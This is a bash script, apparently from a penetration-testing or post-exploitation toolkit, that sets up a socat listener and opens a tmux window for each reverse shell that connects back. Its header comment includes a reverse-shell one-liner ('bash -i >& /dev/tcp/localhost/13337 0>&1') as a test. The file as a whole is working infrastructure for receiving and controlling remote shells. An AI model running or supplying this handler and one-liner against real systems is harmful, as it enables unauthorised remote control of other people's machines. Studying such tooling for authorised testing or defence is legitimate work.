#!/bin/bash
#
# tmux-based reverse shell manager.
# Prerequisites must be in $PATH:
#   - sling-input
#   - sling-watch
#   - sling-catch
#   - socat
#   - tmux
#
#
# Usage:
#   sling-shell.sh [-s session_name] [-p port]
#
# Test with:
#   $ bash -c "bash -i >& /dev/tcp/localhost/13337 0>&1 &"

set -e

# defaults
SESSION=shell
PORT=13337

main() {
  if tmux has-session -t "$SESSION" 2>/dev/null; then
    die "session $SESSION already exists -- attach with: tmux a -t $SESSION"
  fi

  bg_spawn
  fg_attach
}

warn() {
  echo "***" "$@" 1>&2
}
die() {
  echo '!!!' "$@" 1>&2
  exit 1
}

usage() {
  (
    echo "usage: $0 [-s session_name] [-p port]"
    echo ""
    echo "  current settings:"
    echo "    -s $SESSION"
    echo "    -p $PORT"
    echo ""
  ) 1>&2
  exit 1
}

verify_prerequisites() {
  local req=(sling-input sling-watch sling-catch socat tmux)
  local missing=0
  for r in "${req[@]}"; do
    if ! command -v "$r" >&-; then
      (( ++missing ))
      warn "missing prerequisite: $r"
    fi
  done
  if ((missing)); then
    die "Please fix missing prerequisites."
  fi
}

process_options() {
  local need_help=0
  while getopts ":hp:s:" opt; do
    case "$opt" in
      s)
	SESSION="$OPTARG"
	;;
      p)
	PORT="$OPTARG"
	;;
      h)
	need_help=1
	;;
      \?)
	die "unknown option: -$OPTARG (see -h for usage)"
	;;
      :)
	die "-$OPTARG: argument required (see -h for usage)"
	;;
    esac
  done
  shift $((OPTIND-1))

  if ((need_help || $#)); then
    usage
  fi
}


# start session with socat listener and processing loop in background
bg_spawn() {
  # This is a bit awkward.  In order to tie the fate of the backgrounded
  # sling-watch loop to the fate of the socat listener and tmux server, rather
  # than the detachable tmux interface, the entire loop is inserted into the
  # first tmux window.  Another way of doing this would be to decouple the
  # socat listener from the tmux session altogether, but the following
  # unfortunate ugliness is a practical way of accomplishing everything --
  # including cleanup -- with one script.
  export SLING_SESSION="$SESSION"
  export SLING_PORT="$PORT"

  # background content: watch for new sockets and open windows with them.
  local bgcontent='sling-watch |while read sock; do
    echo "new sling socket: $sock";
    tmux new-window -t "$SLING_SESSION" -n "" -d -- sling-catch -c -N -s "$sock" -- socat FD:5 STDIO;
  done'
  # foreground content: socat listener, spawn sling-input
  local fgcontent='socat -d -d TCP4-LISTEN:$SLING_PORT,fork,reuseaddr EXEC:sling-input,nofork'

  tmux new-session -s "$SESSION" -d -- bash -c \
    "trap 'echo \"cleaning up...\"; kill \$(jobs -p) 2>&-; echo \"[press return to end window]\"; read _' EXIT; $bgcontent & $fgcontent"
  #\; set remain-on-exit off   # <-- manually waiting for input is functionally superior to this
}

# attach session to foreground
fg_attach() {
  tmux attach-session -t "$SESSION"
}

verify_prerequisites
process_options "$@"
main
